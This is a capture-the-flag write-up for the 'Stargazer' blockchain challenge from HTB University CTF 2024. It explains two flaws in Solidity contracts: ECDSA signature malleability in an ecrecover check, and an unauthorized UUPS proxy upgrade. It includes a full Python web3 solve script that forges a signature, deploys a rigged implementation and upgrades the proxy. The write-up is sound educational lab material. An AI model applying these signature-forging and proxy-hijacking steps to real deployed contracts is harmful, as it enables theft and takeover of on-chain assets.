---
title: "Stargazer - HTB University CTF 2024: Binary Badlands"
category: "blockchain"
subcategory: "ecc"
type: "writeup"
tags: ["blockchain", "ecc", "ecdsa", "stargazer", "htb-university-ctf-2024-binary", "htb-university-ctf-2024-binary-bad", "2024", "ctf-writeup"]
summary: "HTB UNIVERSITY CTF BINARY BADLANDS"
source:
  name: "CTFtime writeup #39702"
  url: "https://ctftime.org/writeup/39702"
original_source: "https://lape.si/writeups/binarybadlands/stargazer"
ctf:
  name: "HTB University CTF 2024: Binary Badlands"
  year: 2024
  challenge: "Stargazer"
---

## Metadata

- **CTF:** HTB University CTF 2024: Binary Badlands
- **Task:** Stargazer
- **Author team:** Platypwnies
- **CTFtime:** <https://ctftime.org/writeup/39702>
- **Original writeup:** <https://lape.si/writeups/binarybadlands/stargazer>

---
* [HOME](https://lape.si/)
  * [ABOUT](https://lape.si/about)
  * [WRITEUPS](https://lape.si/writeups)
  * [LOGIN](https://lape.si/login)


![](https://lape.si/files/writeups/binarybadlands/background.jpg)

HTB UNIVERSITY CTF BINARY BADLANDS

2024

Stargazer

The Frontier Cluster teeters on the brink of collapse. The planet is ravaged by exploitation and environmental decay, driven by ruthless corporations that have merged into a singular, omnipotent entity known as "The Frontier Board." In a desperate bid to secure humanity's future, a visionary engineer constructs the "Stargazer" — a conscious and empathetic machine designed to endure the harshest conditions of unknown planets. Stargazer's mission is monumental; to explore uncharted worlds, gather crucial data, and identify new planets suitable for colonization. Equipped with advanced sensors and a soulful artificial intelligence, it traverses the cosmos, witnessing celestial wonders beyond human imagination. Amidst its journey through the stars, Stargazer develops a profound sense of melancholy. Despite observing breathtaking cosmic events — supernovae, nebulae, and elusive shooting stars — it is burdened by the realization that many of these phenomena are transient, never to be witnessed again. One such event is the "Starry Spurr", a rare shooting star emitting a unique cosmic frequency, occurring once every millennium. Your goal is to deceyive the machine kernel into believing that it is experiencing the advent of "Starry Spurr" for the second time, in order to bring back joy and solace to the machine.

Blockchain

1000 points

#### Walkthrough

We start by downloading the provided [files](https://lape.si/files/writeups/binarybadlands/stargazer/blockchain_stargazer.zip).

We are given 3 files: 

Setup.sol

, 

Stargazer.sol

, and 

StargazerKernel.sol

.

Additionally, we are provided with two endpoints. One can be accessed with 

nc

, which provides a simple interface to interact with the challenge. We can use this to get our secret key, the stargazer contract address, and the setup contract address, and we can reset the challenge and get the flag if we solved the challenge.

The other endpoint points to the blockchain.

Let's start by examining the provided files:

Setup.sol

includes the winning condition:

```
    function isSolved() public returns (bool) {
        bool success;
        bytes memory getStarSightingsCall;
        bytes memory returnData;
    
        getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, ("Nova-GLIM_007"));
        (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
        require(success, "Setup: failed external call.");
        uint256[] memory novaSightings = abi.decode(returnData, (uint256[]));
        
        getStarSightingsCall = abi.encodeCall(TARGET_IMPL.getStarSightings, ("Starry-SPURR_001"));
        (success, returnData) = address(TARGET_PROXY).call(getStarSightingsCall);
        require(success, "Setup: failed external call.");
        uint256[] memory starrySightings = abi.decode(returnData, (uint256[]));
        
        return (novaSightings.length >= 2 && starrySightings.length >= 2);
    }
```

This means we win if we have at least 2 sightings of both "Nova-GLIM_007" and "Starry-SPURR_001".

Additionally, 

Setup.sol

creates 1 sighting of each star:

```
    constructor(bytes memory signature) payable {
        TARGET_IMPL = new StargazerKernel();
        
        string[] memory starNames = new string[](1);
        starNames[0] = "Nova-GLIM_007";
        bytes memory initializeCall = abi.encodeCall(TARGET_IMPL.initialize, starNames);
        TARGET_PROXY = new Stargazer(address(TARGET_IMPL), initializeCall);
        
        bytes memory createPASKATicketCall = abi.encodeCall(TARGET_IMPL.createPASKATicket, (signature));
        (bool success, ) = address(TARGET_PROXY).call(createPASKATicketCall);
        require(success);
    
        string memory starName = "Starry-SPURR_001";
        bytes memory commitStarSightingCall = abi.encodeCall(TARGET_IMPL.commitStarSighting, (starName));
        (success, ) = address(TARGET_PROXY).call(commitStarSightingCall);
        require(success);
    
        emit DeployedTarget(address(TARGET_PROXY), address(TARGET_IMPL));
    }
```

Stargazer.sol

is just a proxy contract that forwards calls to the 

StargazerKernel.sol

contract.

```
    import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
    
    contract Stargazer is ERC1967Proxy {
        constructor(address _implementation, bytes memory _data) ERC1967Proxy(_implementation, _data) {}
    }
```

This is weird, because there is no obvious reason to use a proxy contract here.

StargazerKernel.sol

is the main contract that handles the star sightings. The most interesting function is 

commitStarSighting

:

```
    function commitStarSighting(string memory _starName) public onlyProxy {
        address author = tx.origin;
        PASKATicket memory starSightingCommitRequest = _consumePASKATicket(author);
        StargazerMemories storage $ = _getStargazerMemory();
        bytes32 starId = keccak256(abi.encodePacked(_starName));
        uint256 sightingTimestamp = block.timestamp;
        $.starSightings[starId].push(sightingTimestamp);
        emit StarSightingRecorded(_starName, sightingTimestamp);
    }
```

Unfortunately, we can't call this function directly, because it requires a 

PASKATicket

that we don't have. There is another function that creates a 

PASKATicket

, but it requires a signature that we don't have:

```
    function createPASKATicket(bytes memory _signature) public onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce;
        bytes32 hashedRequest = _prefixed(
            keccak256(abi.encodePacked("PASKA: Privileged Authorized StargazerKernel Action", nonce))
        );
        PASKATicket memory newTicket = PASKATicket(hashedRequest, _signature);
        _verifyPASKATicket(newTicket);
        $.kernelMaintainers[tx.origin].PASKATickets.push(newTicket);
        $.kernelMaintainers[tx.origin].PASKATicketsNonce++;
        emit PASKATicketCreated(newTicket);
    }
```

We somehow need to get a 

PASKATicket

or a signature to create one. Fortunately, the 

PASKATicket

used in the setup contract is logged in the event 

PASKATicketCreated

. This means we can get a used 

PASKATicket

from the blockchain.

The 

PASKATicket

contains the used signature:

```
    struct PASKATicket {
        bytes32 hashedRequest;
        bytes signature;
    }
```

We now need to forge a new signature that will allow us to create a 

PASKATicket

and commit a star sighting.

That is actually manageable, because the signature has a huge flaw:

```
    function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
        require(_signature.length == 65, "StargazerKernel: invalid signature length.");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly ("memory-safe") {
            r := mload(add(_signature, 0x20))
            s := mload(add(_signature, 0x40))
            v := byte(0, mload(add(_signature, 0x60)))
        }
        require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
        address signer = ecrecover(_message, v, r, s);
        require(signer != address(0), "StargazerKernel: invalid signature.");
        return signer;
    }
```

This function uses the 

ecrecover

function to recover the signer of a message. This function is vulnerable to the 

signature malleability

attack. This means that we can change the 

s

value of the signature to get a new valid signature. To do that we just have to extract the 

r

, 

s

, and 

v

values from the signature and change the 

s

value to 

-s % n

, where 

n

is the order of the elliptic curve.

We can then use this new signature to create a 

PASKATicket

and commit a star sighting.

Unfortunately this will not solve the challenge, because we need to have at least 2 sightings of both "Nova-GLIM_007" and "Starry-SPURR_001". We can't add two sightings, because we can only forge one signature this way.

Now is the point where we have to step back and think about the challenge. There was that one weird thing about the proxy contract. Why would you use a proxy contract here?

The answer is that the proxy contract has a function that allows us to change the implementation contract named 

upgradeToAndCall

. This means we can change the implementation contract to a new contract that doesn't require a 

PASKATicket

to commit a star sighting.

Or we can just rewrite the 

getStarSightings

function to return 2 or more sighings. This way we automatically win the challenge:

```
    function getStarSightings(string memory _starName) public view onlyProxy returns (uint256[] memory) {
        // return 3 long array for testing
        return new uint256[](3); // haha free flag
    }
```

To do all of this we can use the following python script. But first we need to get the ABI of the contracts. To get them we can use the online IDE named [Remix](https://remix.ethereum.org/).

You can download the abi file [here](https://lape.si/files/writeups/binarybadlands/stargazer/abi.py) and the python script [here](https://lape.si/files/writeups/binarybadlands/stargazer/solve.py).

It contains the following code, which will do exactly what we described above (the signature forging works most of the time, you may have to restart and try a few times):

```
    from web3 import Web3, AsyncWeb3
    from abi import SETUP_ABI, KERNEL_ABI, STARGAZER_ABI
    from Crypto.Util.number import bytes_to_long, long_to_bytes
    from ecdsa import SECP256k1
    from solcx import compile_source, install_solc
    
    
    PRIVATE_KEY = "0xef66a71da024a46c74e221868a6952c309d621ff8c88df3843adf0ac71018953"
    TARGET_CONTRACT = "0x2940b887F2F82aA7B767F2393d882898B94480d5"
    SETUP_CONTRACT = "0x362f0F9Ea3Ffe5cC679A84edA082F7A2184334cC"
    
    def print_balance(w3: Web3, account: str) -> None:
        balance = w3.eth.get_balance(account) / 10**18
        print(f"Balance of {account}: {balance}")
    
    def read_starsights(w3: Web3, contract, account:str, star:str):
        starsights = contract.functions.getStarSightings(star).call({'from': account})
        return starsights
    
    # Connect to the blockchain
    w3 = Web3(Web3.HTTPProvider('http://94.237.50.83:56478'))
    # Test the connection
    connection_status = w3.is_connected()
    print(f"Connected to the blockchain: {connection_status}")
    
    # Add account from private key
    account = w3.eth.account.from_key(PRIVATE_KEY)
    print(f"Account: {account.address}")
    
    # Check the balance
    print_balance(w3, account.address)
    
    setup_contract = w3.eth.contract(address=SETUP_CONTRACT, abi=SETUP_ABI)
    print(f"Setup contract: {setup_contract}")
    
    # Load the contract
    contract = w3.eth.contract(address=TARGET_CONTRACT, abi=KERNEL_ABI)
    print(f"Contract: {contract}")
    
    # list all the functions of the contract
    functions = contract.all_functions()
    print(f"Functions: {functions}")
    
    # Read the starsights
    starsights = read_starsights(w3, contract, account.address, "Nova-GLIM_007")
    print(f"Starsights Nova-GLIM_007: {starsights}")
    
    # Read the starsights
    starsights = read_starsights(w3, contract, account.address, "Starry-SPURR_001")
    print(f"Starsights Starry-SPURR_001: {starsights}")
    
    event_signature = contract.events.PASKATicketCreated.create_filter(fromBlock=0, toBlock='latest')
    events = event_signature.get_all_entries()
    
    # Print out the events
    for event in events:
        print(f"Ticket Hashed Request: {event['args']['ticket']['hashedRequest']}")
        print(f"Ticket Signature: {event['args']['ticket']['signature']}")
    
    ticket = events[0]['args']['ticket']
    print(f"Ticket: {ticket}")
    ticket_hash = ticket['hashedRequest']
    ticket_signature = ticket['signature']
    print(f"Ticket Hashed Request: {ticket_hash}")
    print(f"Ticket Signature: {ticket_signature}")
    
    sig_len = len(ticket_signature)
    print(f"Signature length: {sig_len}")
    
    r = int.from_bytes(ticket_signature[:0x20], 'big')
    print(f"r: {r}")
    s = int.from_bytes(ticket_signature[0x20:0x40], 'big')
    print(f"s: {s}")
    v = int.from_bytes(ticket_signature[0x40:0x41], 'big')
    print(f"v: {v}")
    
    s_prime = (-s) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    print(f"s_prime: {s_prime}")
    
    # Create the new signature
    new_signature = ticket_signature[:0x20] + s_prime.to_bytes(0x20, 'big') + bytes([28])
    print(f"New Signature: {new_signature}")
    
    ## Create the new ticket
    tx_hash = contract.functions.createPASKATicket(new_signature).transact({'from': account.address})
    print(f"Transaction Hash: {tx_hash.hex()}")
    
    '''
    # Commit star sighting
    tx_hash = contract.functions.commitStarSighting("Nova-GLIM_007").transact({'from': account.address})
    print(f"Transaction Hash: {tx_hash.hex()}")
    
    # Read the starsights
    starsights = read_starsights(w3, contract, account.address, "Nova-GLIM_007")
    print(f"Starsights Nova-GLIM_007: {starsights}")
    '''
    
    # upgrade the contract
    compiled_sol = compile_source('''
                                  // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.20;
    
    import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
    
    contract StargazerKernel is UUPSUpgradeable {
        // keccak256(abi.encode(uint256(keccak256("htb.storage.Stargazer")) - 1)) & ~bytes32(uint256(0xff));
        bytes32 private constant __STARGAZER_MEMORIES_LOCATION = 0x8e8af00ddb7b2dfef2ccc4890803445639c579a87f9cda7f6886f80281e2c800;
        
        /// @custom:storage-location erc7201:htb.storage.Stargazer
        struct StargazerMemories {
            uint256 originTimestamp; 
            mapping(bytes32 => uint256[]) starSightings;
            mapping(bytes32 => bool) usedPASKATickets;
            mapping(address => KernelMaintainer) kernelMaintainers;
        }
    
        struct KernelMaintainer {
            address account;
            PASKATicket[] PASKATickets;
            uint256 PASKATicketsNonce;
        }
    
        struct PASKATicket {
            bytes32 hashedRequest;
            bytes signature;
        }
    
        event PASKATicketCreated(PASKATicket ticket);
        event StarSightingRecorded(string starName, uint256 sightingTimestamp);
        event AuthorizedKernelUpgrade(address newImplementation);
    
        function initialize(string[] memory _pastStarSightings) public initializer onlyProxy {
            StargazerMemories storage $ = _getStargazerMemory();
            $.originTimestamp = block.timestamp;
            $.kernelMaintainers[tx.origin].account = tx.origin;
            for (uint256 i = 0; i < _pastStarSightings.length; i++) {
                bytes32 starId = keccak256(abi.encodePacked(_pastStarSightings[i]));
                $.starSightings[starId].push(block.timestamp);
            }
        }
    
        function createPASKATicket(bytes memory _signature) public onlyProxy {
            StargazerMemories storage $ = _getStargazerMemory();
            uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce;
            bytes32 hashedRequest = _prefixed(
                keccak256(abi.encodePacked("PASKA: Privileged Authorized StargazerKernel Action", nonce))
            );
            PASKATicket memory newTicket = PASKATicket(hashedRequest, _signature);
            _verifyPASKATicket(newTicket);
            $.kernelMaintainers[tx.origin].PASKATickets.push(newTicket);
            $.kernelMaintainers[tx.origin].PASKATicketsNonce++;
            emit PASKATicketCreated(newTicket);
        }
    
        function commitStarSighting(string memory _starName) public onlyProxy {
            address author = tx.origin;
            PASKATicket memory starSightingCommitRequest = _consumePASKATicket(author);
            StargazerMemories storage $ = _getStargazerMemory();
            bytes32 starId = keccak256(abi.encodePacked(_starName));
            uint256 sightingTimestamp = block.timestamp;
            $.starSightings[starId].push(sightingTimestamp);
            emit StarSightingRecorded(_starName, sightingTimestamp);
        }
    
        function getStarSightings(string memory _starName) public view onlyProxy returns (uint256[] memory) {
            // return 3 long array for testing
            return new uint256[](3); // haha free flag
        }
    
        function _getStargazerMemory() private view onlyProxy returns (StargazerMemories storage $) {
            assembly { $.slot := __STARGAZER_MEMORIES_LOCATION }
        }
    
        function _getKernelMaintainerInfo(address _kernelMaintainer) internal view onlyProxy returns (KernelMaintainer memory) {
            StargazerMemories storage $ = _getStargazerMemory();
            return $.kernelMaintainers[_kernelMaintainer];
        }
    
        function _authorizeUpgrade(address _newImplementation) internal override onlyProxy {
            address issuer = tx.origin;
            PASKATicket memory kernelUpdateRequest = _consumePASKATicket(issuer);
            emit AuthorizedKernelUpgrade(_newImplementation);
        }
    
        function _consumePASKATicket(address _kernelMaintainer) internal onlyProxy returns (PASKATicket memory) {
            StargazerMemories storage $ = _getStargazerMemory();
            KernelMaintainer storage maintainer = $.kernelMaintainers[_kernelMaintainer];
            PASKATicket[] storage activePASKATickets = maintainer.PASKATickets;
            require(activePASKATickets.length > 0, "StargazerKernel: no active PASKA tickets.");
            PASKATicket memory ticket = activePASKATickets[activePASKATickets.length - 1];
            bytes32 ticketId = keccak256(abi.encode(ticket));
            $.usedPASKATickets[ticketId] = true;
            activePASKATickets.pop();
            return ticket;
        }
    
        function _verifyPASKATicket(PASKATicket memory _ticket) internal view onlyProxy {
            StargazerMemories storage $ = _getStargazerMemory();
            address signer = _recoverSigner(_ticket.hashedRequest, _ticket.signature);
            require(_isKernelMaintainer(signer), "StargazerKernel: signer is not a StargazerKernel maintainer.");
            bytes32 ticketId = keccak256(abi.encode(_ticket));
            require(!$.usedPASKATickets[ticketId], "StargazerKernel: PASKA ticket already used.");
        }
    
        function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) {
            require(_signature.length == 65, "StargazerKernel: invalid signature length.");
            bytes32 r;
            bytes32 s;
            uint8 v;
            assembly ("memory-safe") {
                r := mload(add(_signature, 0x20))
                s := mload(add(_signature, 0x40))
                v := byte(0, mload(add(_signature, 0x60)))
            }
            require(v == 27 || v == 28, "StargazerKernel: invalid signature version");
            address signer = ecrecover(_message, v, r, s);
            require(signer != address(0), "StargazerKernel: invalid signature.");
            return signer;
        }
    
        function _isKernelMaintainer(address _account) internal view onlyProxy returns (bool) {
            StargazerMemories storage $ = _getStargazerMemory();
            return $.kernelMaintainers[_account].account == _account;
        }
    
        function _prefixed(bytes32 hash) internal pure returns (bytes32) {
            return keccak256(abi.encodePacked("Ethereum Signed Message:32", hash));
        }
    }
    ''', solc_version='0.8.26', base_path='./node_modules')     
    
    
    # Prepare the contract deployment transaction
    transaction = w3.eth.contract(abi=KERNEL_ABI, bytecode=compiled_sol['<stdin>:StargazerKernel']['bin']).constructor().build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address)
    })
    
    # Sign the transaction
    signed_txn = w3.eth.account.sign_transaction(transaction, private_key=account._private_key)
    
    # Send the transaction to deploy the contract
    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    
    # Wait for the transaction to be mined
    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    
    # Get the contract address
    contract_address = txn_receipt.contractAddress
    print(f"Contract Address: {contract_address}")
    
    call = contract.encodeABI(fn_name='getStarSightings', args=["Nova-GLIM_007"])
    tx_hash = contract.functions.upgradeToAndCall(contract_address, call).transact({'from': account.address})
    print(f"Transaction Hash: {tx_hash.hex()}")
    
    
    # Read the starsights
    starsights = read_starsights(w3, contract, account.address, "Nova-GLIM_007")
    print(f"Starsights Nova-GLIM_007: {starsights}")
    
    # Read the starsights
    starsights = read_starsights(w3, contract, account.address, "Starry-SPURR_001")
    print(f"Starsights Starry-SPURR_001: {starsights}")
```

After running the script, we can use the small interface to print the flag.

Was this helpful?

[Back](https://lape.si/writeups/binarybadlands)
